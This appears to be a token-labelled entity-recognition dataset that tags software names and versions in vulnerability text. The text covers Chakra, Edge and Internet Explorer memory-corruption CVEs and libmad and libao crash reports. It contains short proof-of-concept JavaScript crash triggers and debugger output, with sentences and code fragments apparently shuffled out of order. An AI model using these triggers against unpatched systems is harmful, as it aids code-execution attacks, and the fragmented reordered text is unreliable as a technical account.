: O
Just O
Float O
is O
considered O
an O
Object O
type O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11837 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

ChakraCore O
and O
Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
R2 SV
, O
and O
Microsoft O
Edge O
and O
Internet O
Explorer O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11836 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11837 O
, O
CVE-2017-11838 O
, O
CVE-2017-11839 O
, O
CVE-2017-11840 O
, O
CVE-2017-11841 O
, O
CVE-2017-11843 O
, O
CVE-2017-11846 O
, O
CVE-2017-11858 O
, O
CVE-2017-11859 O
, O
CVE-2017-11861 O
, O
CVE-2017-11862 O
, O
CVE-2017-11866 O
, O
CVE-2017-11869 O
, O
CVE-2017-11870 O
, O
CVE-2017-11871 O
, O
and O
CVE-2017-11873 O
. O

ChakraCore O
, O
and O
Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows SN
Server SV
, O
version SV
1709 SV
allows O
an O
attacker O
to O
take O
control O
of O
an O
affected O
system O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
and O
Microsoft O
Edge O
and O
Internet O
Explorer O
in O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
1709 SV
, O
Windows SN
Server SV
2016 SV
and O
Windows O
Server O
, O
version O
1709 O
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
how O
Microsoft O
browsers O
handle O
objects O
in O
memory O
, O
aka O
Microsoft O
Browser O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11813 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11822 O
. O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
and O
Windows SN
Server SV
2012 SV
R2 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
Internet O
Explorer O
handles O
objects O
in O
memory O
, O
aka O
Internet O
Explorer O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

0017 O
Line O
4 O
: O
switch O
( O
i O
) O
{ O
Col O
9 O
: O
^ O
StatementBoundary O
3 O
001a O
s63 O
( O
s26 O
) O
.i32 O
= O
FromVar O
s26 O
[ O
LikelyCanBeTaggedValue_Int_Number O
] O
.var O
001a O
Bailout O
: O
001a O
( O
BailOutExpectingInteger O
) O
BrLt_I4 O
$ O
L4 O
, O
s63 O
( O
s26 O
) O
.i32 O
, O
2 O
( O
0x2 O
) O
.i32 O
0079 O
BrGt_I4 O
$ O
L4 O
, O
s63 O
( O
s26 O
) O
.i32 O
, O
38 O
( O
0x26 O
) O
.i32 O
0079 O
MultiBr O
... O
, O
s27 O
[ O
LikelyCanBeTaggedValue_Int O
] O
.var O
0079 O
It O
ended O
up O
to O
use O
j O
of O
type O
Var O
as O
the O
offset O
variable O
. O

In O
the O
above O
code O
, O
s26 O
is O
ensured O
to O
be O
of O
type O
Int32 O
by O
the O
bailout O
. O

What O
I O
noticed O
is O
s28.var O
= O
Sub_A O
s26.var O
, O
2 O
( O
0x2 O
) O
.i32 O
. O

So O
, O
the O
other O
variables O
affected O
by O
s26 O
including O
the O
offset O
variable O
s28 O
are O
also O
ensured O
to O
be O
of O
type O
Int32 O
. O

0079 O
The O
offset O
variable O
is O
replaced O
with O
j O
that O
is O
not O
ensured O
to O
be O
of O
type O
Int32 O
. O

MultiBr O
... O
, O
s28.var O
0070 O
IRs O
after O
Type O
Specialization O
: O
s52 O
( O
s26 O
) O
.i32 O
= O
Ld_A O
s51 O
( O
s24 O
) O
.i32 O
- O
i O
0011 O
BrLt_I4 O
$ O
L2 O
, O
s51 O
( O
s24 O
) O
.i32 O
, O
2 O
( O
0x2 O
) O
.i32 O
0070 O
$ O
L9 O
: O
0070 O
BrGt_I4 O
$ O
L2 O
, O
s51 O
( O
s24 O
) O
.i32 O
, O
38 O
( O
0x26 O
) O
.i32 O
0070 O
$ O
L8 O
: O
0070 O
s53 O
( O
s28 O
) O
.i32 O
= O
Sub_I4 O
s51 O
( O
s24 O
) O
.i32 O
, O
2 O
( O
0x2 O
) O
.i32 O
0070 O
MultiBr O
... O
, O
s53 O
( O
s28 O
) O
.i32 O
! O

If O
not O
, O
type O
confusion O
will O
occur O
. O

It O
was O
bypassed O
with O
the O
CSE O
phase O
. O

CORRECTION O
: O
The O
bug O
was O
that O
it O
tried O
to O
ensure O
the O
type O
using O
BailOutExpectingInteger O
, O
even O
if O
i O
was O
not O
always O
of O
type O
Int32 O
. O

If O
we O
declare O
a O
variable O
j O
with O
i O
- O
2 O
, O
the O
offset O
variable O
s28 O
will O
be O
replaced O
with O
j O
in O
the O
CSE O
phase O
. O

Before O
the O
CSE O
phase O
: O
Var O
j O
= O
ToVar O
( O
i O
- O
2 O
) O
; O
int32_t O
offset O
= O
i O
- O
2 O
; O
jmp O
jump_table O
[ O
offset O
] O
; O
After O
the O
CSE O
phase O
: O
Var O
j O
= O
ToVar O
( O
i O
- O
2 O
) O
; O
jmp O
jump_table O
[ O
j O
] O
; O
/ O

The O
way O
to O
ensure O
it O
is O
to O
use O
BailOutExpectingInteger O
. O

Microsoft O
Edge O
Chakra O
JIT O
- O
Type O
Confusion O
with O
switch O
Statements O

Internet O
Explorer O
in O
Microsoft SN
Windows SN
7 SV
SP1 SV
, O
Windows SN
Server SV
2008 SV
SP2 SV
and SV
R2 SV
SP1 SV
, O
Windows SN
8.1 SV
and O
Windows SN
RT SV
8.1 SV
, O
Windows SN
Server SV
2012 SV
and SV
R2 SV
, O
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

Later O
, O
when O
AString O
is O
converted O
to O
the O
BString O
in O
AString O
: O
:ConvertToBSTR O
, O
the O
size O
of O
the O
result O
BString O
could O
be O
calculated O
incorrectly O
which O
can O
lead O
to O
a O
heap O
overflow O
. O

( O
The O
PoC O
above O
crashes O
in O
memcpy O
when O
attempting O
to O
copy O
a O
large O
amount O
of O
data O
) O
. O

jscript.dll O
is O
an O
old O
JavaScript O
library O
that O
was O
used O
in O
IE O
8 O
and O
back O
. O

However O
, O
IE O
11 O
can O
still O
load O
it O
if O
put O
into O
IE O
8 O
compatibility O
mode O
and O
if O
there O
is O
a O
script O
tag O
that O
can O
only O
be O
understood O
by O
the O
older O
library O
( O
specifically O
, O
a O
script O
tag O
with O
language= O
Jscript.Encode O
attribute O
will O
do O
the O
trick O
) O
. O

eax=00000003 O
ebx=00000006 O
ecx=dcbabbb8 O
edx=00000003 O
esi=e6e8bb7f O
edi=e900fb9b O
eip=751c9a6c O
esp=09dfbdfc O
ebp=09dfbe04 O
iopl=0 O
nv O
up O
ei O
ng O
nz O
na O
pe O
nc O
cs=0023 O
ss=002b O
ds=002b O
es=002b O
fs=0053 O
gs=002b O
efl=00010286 O
msvcrt O
! O
memcpy+0x270 O
: O
751c9a6c O
8a4603 O
mov O
al O
, O
byte O
ptr O
[ O
esi+3 O
] O
ds:002b O
: O
e6e8bb82= O

Debug O
log O
: O
( O
10b8.1364 O
) O
: O
Access O
violation O
- O
code O
c0000005 O
( O
first O
chance O
) O
First O
chance O
exceptions O
are O
reported O
before O
any O
exception O
handling O
. O

Microsoft SN
Internet SN
Explorer SN
11 SV
- O
jscript O
! O
JsErrorToString O
Use-After-Free O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

But O
at O
( O
a O
) O
, O
if O
it O
fails O
to O
allocate O
Js O
: O
:Constants O
: O
:MinStackInterpreter O
bytes O
to O
the O
stack O
, O
it O
throws O
an O
exception O
which O
leads O
to O
the O
following O
code O
. O

In O
the O
PoC O
, O
the O
variables O
a O
, O
b O
and O
c O
are O
initialized O
. O

Js O
: O
:Var O
Js O
: O
:InterpreterStackFrame O
: O
:INTERPRETERLOOPNAME O
( O
) O
{ O
PROBE_STACK O
( O
scriptContext O
, O
Js O
: O
:Constants O
: O
:MinStackInterpreter O
) O
; O
( O
a O
) O
if O
( O
! O
this- O
> O
closureInitDone O
) O
{ O
Assert O
( O
this- O
> O
m_reader.GetCurrentOffset O
( O
) O
0 O
) O
; O
this- O
> O
InitializeClosures O
( O
) O
; O
( O
b O
interprets O
the O
bytecode O
... O
At O
( O
b O
) O
, O
it O
initializes O
the O
local O
variables O
of O
the O
javascript O
function O
. O

void O
StackScriptFunction O
: O
:BoxState O
: O
:Box O
if O
( O
callerFunctionBody- O
> O
DoStackScopeSlots O
( O
) O
) O
{ O
Var O
stackScopeSlots O
= O
( O
Var O
) O
interpreterFrame- O
> O
GetLocalClosure O
( O
) O
; O
if O
( O
stackScopeSlots O
) O
{ O
Var O
boxedScopeSlots O
= O
this- O
> O
BoxScopeSlots O
( O
stackScopeSlots O
, O
ScopeSlots O
( O
stackScopeSlots O
) O
.GetCount O
( O
) O
) O
; O
interpreterFrame- O
> O
SetLocalClosure O
( O
( O
Var O
) O
boxedScopeSlots O
stackScopeSlots O
contains O
the O
local O
variables O
that O
were O
supposed O
to O
be O
initialized O
at O
( O
b O
) O
. O

So O
I O
recommend O
to O
use O
the O
command O
: O
./Debug/ch O
-NoNative O
~/test.js O
. O

PoC O
: O
function O
trigger O
( O
) O
{ O
let O
a O
, O
b O
, O
c O
; O
function O
g O
( O
) O
{ O
trigger O
( O
) O
; O
a O
, O
b O
, O
c O
; O
} O
g O
( O
) O
; O
} O
trigger O
( O
) O
; O

So O
it O
results O
in O
accessing O
the O
uninitialized O
pointers O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

ChakraCore O
and O
Microsoft O
Edg O
e O
in O
Microsoft SN
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

bool O
Lowerer O
: O
:GenerateStFldWithCachedType O
( O
IR O
: O
:Instr O
instrStFld O
, O
bool O
continueAsHelperOut O
, O
IR O
: O
:LabelInstr O
labelHelperOut O
, O
IR O
: O
:RegOpnd O
typeOpndOut O
instrStFld- O
> O
m_opcode O
= O
Js O
: O
:OpCode O
: O
:BailOut O
; O
instrStFld- O
> O
FreeSrc1 O
( O
) O
; O
should O
call O
FreeSrc2 O
instrStFld- O
> O
FreeDst O
( O
) O
; O
this- O
> O
GenerateBailOut O
( O
instrStFld O
PoC O
: O
class O
MyClass O
{ O
constructor O
( O
) O
{ O
this.arr O
= O
[ O
1 O
, O
2 O
, O
3 O
] O
; O
} O
f O
( O
) O
{ O
super.arr O
= O
; O
this.x O
; O
for O
passing O
BackwardPass O
: O
:DeadStoreTypeCheckBailOut O
} O

49 O
FF O
C5 O
is O
x86-64 O
code O
actually O
generated O
and O
disassembled O
as O
inc O
r13 O
. O

So O
, O
what O
happens O
if O
a O
Call O
instruction O
has O
Src2 O

This O
is O
performed O
by O
the O
method O
Lowerer O
: O
:GenerateBailOut O
. O

So O
the O
following O
method O
should O
have O
freed O
Src2 O
. O

The O
result O
will O
anyway O
go O
into O
the O
return O
register O
, O
but O
the O
register O
allocator O
does O
not O
need O
to O
kill O
that O
register O
for O
the O
call O
. O

In O
these O
cases O
, O
it O
ends O
up O
to O
be O
converted O
to O
Js O
: O
:OpCode O
: O
:Call O
with O
Src2 O
. O

PoC O
bug O
: O
The O
following O
buggy O
method O
is O
used O
to O
convert O
a O
St O
Fld O
instruction O
to O
a O
bailout O
. O

} O
let O
c O
= O
new O
MyClass O
( O
) O
; O
for O
( O
let O
i O
= O
0 O
; O
i O
< O
0x10000 O
; O
i++ O
) O
{ O
c.f O
( O
) O
; O
} O

Unlike O
just O
StFld O
instructions O
, O
StSuperFld O
instructions O
take O
Src2 O
as O
this O
. O

Microsoft O
Edge O
Chakra O
JIT O
- O
Incorrect O
GenerateBailOut O
Calling O
Patterns O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
Gold SV
, O
1511 SV
, O
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11797 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Windows SN
10 SV
1703 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11793 O
, O
CVE-2017-11797 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11792 O
, O
CVE-2017-11796 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

jscript O
! O
JSONStringifyArray+0x38f O
: O
000007fe`edbf9fb3 O
66214738 O
and O
word O
ptr O
[ O
rdi+38h O
] O
, O
ax O
ds:00000000`04518fc8= O

Microsoft SN
Internet SN
Explorer SN
11 SV
- O
jscript O
! O
JSONStringifyObject O
Use-After-Free O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-11793 O
, O
CVE-2017-11796 O
, O
CVE-2017-11798 O
, O
CVE-2017-11799 O
, O
CVE-2017-11800 O
, O
CVE-2017-11801 O
, O
CVE-2017-11802 O
, O
CVE-2017-11804 O
, O
CVE-2017-11805 O
, O
CVE-2017-11806 O
, O
CVE-2017-11807 O
, O
CVE-2017-11808 O
, O
CVE-2017-11809 O
, O
CVE-2017-11810 O
, O
CVE-2017-11811 O
, O
CVE-2017-11812 O
, O
and O
CVE-2017-11821 O
. O

ChakraCore O
and O
Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1703 SV
allow O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
how O
the O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

ChakraCore O
allows O
an O
attacker O
to O
gain O
the O
same O
user O
rights O
as O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
ChakraCore O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

This O
CVE O
ID O
is O
unique O
from O
CVE-2017-8649 O
, O
CVE-2017-8660 O
, O
CVE-2017-8729 O
, O
CVE-2017-8738 O
, O
CVE-2017-8740 O
, O
CVE-2017-8741 O
, O
CVE-2017-8748 O
, O
CVE-2017-8752 O
, O
CVE-2017-8753 O
, O
CVE-2017-8755 O
, O
and O
CVE-2017-8756 O
. O

Microsoft O
Edge O
in O
Microsoft SN
Windows SN
10 SV
1607 SV
, O
1703 SV
, O
and O
Windows SN
Server SV
2016 SV
allows O
an O
attacker O
to O
execute O
arbitrary O
code O
in O
the O
context O
of O
the O
current O
user O
, O
due O
to O
the O
way O
that O
the O
Microsoft O
Edge O
scripting O
engine O
handles O
objects O
in O
memory O
, O
aka O
Scripting O
Engine O
Memory O
Corruption O
Vulnerability O
. O

ScopeType_CatchParamPattern O
: O
ScopeType_Catch O
ParseNodePtr O
pnodePattern O
= O
ParseDestructuredLiteral O
< O
buildAST O
> O
( O
tkLET O
, O
true O
isDecl O
/ O
, O
true O
topLevel O
/ O
, O
DIC_ForceErrorOnInitializer O
1 O
. O

But O
pnodeCatchScope O
is O
not O
inserted O
into O
the O
AST O
. O

If O
the O
parser O
meets O
eval O
in O
ParseDestructuredLiteral O
, O
it O
calls O
pnodeCatchScope- O
> O
SetCallsEval O
. O

Chakra O
handles O
this O
from O
the O
parser O
. O

ParseNodePtr O
Parser O
: O
:ParseCatch O
pnodeCatchScope O
= O
StartParseBlock O
< O
buildAST O
> O
( O
PnodeBlockType O
: O
:Regular O
, O
isPattern O

pnodeCatchScope O
is O
a O
temporary O
block O
used O
to O
create O
a O
scope O
, O
and O
it O
is O
not O
actually O
inserted O
into O
the O
AST O
. O

There O
is O
a O
Mismatched O
Memory O
Management O
Routines O
vulnerability O
in O
the O
Exiv2 SN
: O
:FileIo O
: O
:seek O
function O
of O
Exiv2 O
0.26 SV
that O
will O
lead O
to O
a O
remote O
denial O
of O
service O
attack O
( O
heap O
memory O
corruption O
) O
via O
crafted O
input O
. O

mpg321.c O
in O
mpg321 SN
0.3.2-1 SV
does O
not O
properly O
manage O
memory O
for O
use O
with O
libmad O
0.15.1b SV
, O
which O
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
seen O
in O
a O
crash O
in O
the O
mad_decoder_run O
function O
in O
decoder.c O
in O
libmad O
) O
via O
a O
crafted O
MP3 O
file O
. O

libmad O
memory O
corruption O
vulnerability O
Author O
: O
qflb.wu O
Introduction O
: O
libmad O
is O
a O
high-quality O
MPEG O
audio O
decoder O
capable O
of O
24-bit O
output O
. O

Description O
: O
the O
mad_decoder_run O
function O
in O
decoder.c O
in O
libmad SN
0.15.1b SV
can O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
mp3 O
file O
. O

Affected O
version O
: O
0.15.1b SV
Vulnerability O

I O
found O
this O
bug O
when O
I O
test O
mpg321 SN
0.3.2 SV
which O
used O
the O
libmad O
library O
. O

0x00007ffff6bf7cc9 O
in O
GI_raise O
( O
sig=sig O
@ O
entry=6 O
) O
at O
../nptl/sysdeps/unix/sysv/linux/raise.c:56 O
56../nptl/sysdeps/unix/sysv/linux/raise.c O
: O
No O
such O
file O
or O
directory O
. O

libmad SN
0.15.1b SV
- O
mp3 O
Memory O
Corruption O

_tokenize_matrix O
function O
in O
audio_out.c O
in O
Xiph.Org SN
libao SN
1.2.0 SV
allows O
remote O
attackers O
to O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
MP3 O
file O
. O

Description O
: O
the O
_tokenize_matrix O
function O
in O
audio_out.c O
in O
Xiph.Org SN
libao SN
1.2.0 SV
can O
cause O
a O
denial O
of O
service O
( O
memory O
corruption O
) O
via O
a O
crafted O
mp3 O
file O
. O

I O
found O
this O
bug O
when O
I O
test O
mpg321 SN
0.3.2 SV
which O
used O
the O
libao O
library O
. O

_int_malloc O
( O
av=av O
@ O
entry=0x7ffff6f7f760 O
< O
main_arena O
> O
, O
bytes=bytes O
@ O
entry=3 O
) O
at O
malloc.c:3740 O
3740malloc.c O
: O
No O
such O
file O
or O
directory O
. O

Affected O
version O
: O
1.2.0 SV
Vulnerability O

libao SN
1.2.0 SV
- O
Denial O
of O
Service O

An O
issue O
was O
discovered O
in O
Adobe SN
Photoshop SN
18.1.1 SV
( O
2017.1.1 SV
) O
and SV
earlier SV
versions O
. O

An O
exploitable O
memory O
corruption O
vulnerability O
exists O
. O

